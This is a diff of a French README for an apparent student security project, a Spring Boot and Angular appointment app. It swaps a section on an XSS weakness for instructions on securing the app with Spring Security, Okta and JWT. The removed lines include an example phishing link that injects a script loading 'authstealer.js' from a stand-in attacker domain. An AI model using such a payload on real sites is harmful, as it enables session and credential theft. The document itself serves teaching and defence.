@@ -55,10 +55,17 @@ Enfin, on crée le formulaire qui nous permet de modifier et ajouter des rdvs, o
 
 # Mettre Image
 
-## Problème de vulnérabilité XSS côté SpringBoot :
+## Sécurisation de l'application avec Spring-Boot Security, Okta et Angular :
 
-Si on imagine un problème de pishing quelconque qui nous conduit à cliquer sur un lien frauduleux : [I'm an fraudulent link](http://localhost:8080/rdvs?q=puppies%3Cscript%20src=%22http://mallorysevilsite.com/authstealer.js%22%3E%3C/script%3E)
+Notre application est pour le moment totalement accessible a tous et donc vulnérable à quiconque possède l'url ou à accès au terminal dans le cas d'une app en local.
+Notre premier objectif est donc de crée un portail d'authzentification se basant sur okta afin de filtrer les utilisateurs.
 
-On voit que springboot permet d'acceder à cette url :
+## mise en place sur Spring-Boot :
 
-![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/ex_xss.PNG "Logo Title Text 1")
+On commence par configurer la partie sécurité sur le serveur. Pour cela, on va crée une classe SecurityConfiguration qui étend la classe spring-boot WebSecurityConfigurerAdapter. C'est à partir de que l'on va demander à ce que chaque requête http fournisse un jeton jwt qui sera ensuite comparé au données fournies à l'application et présente sur le serveur okta. Cela donne :
+
+![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/sp_sec.PNG "Logo Title Text 1")
+
+une fois cela fait, la partie serveur est alors bloqué par un portail sécurisé :
+
+![alt text](https://github.com/Sheecss/Ue_CyberApp_Ferretti/blob/main/img/sp_sec_serv.PNG "Logo Title Text 1")
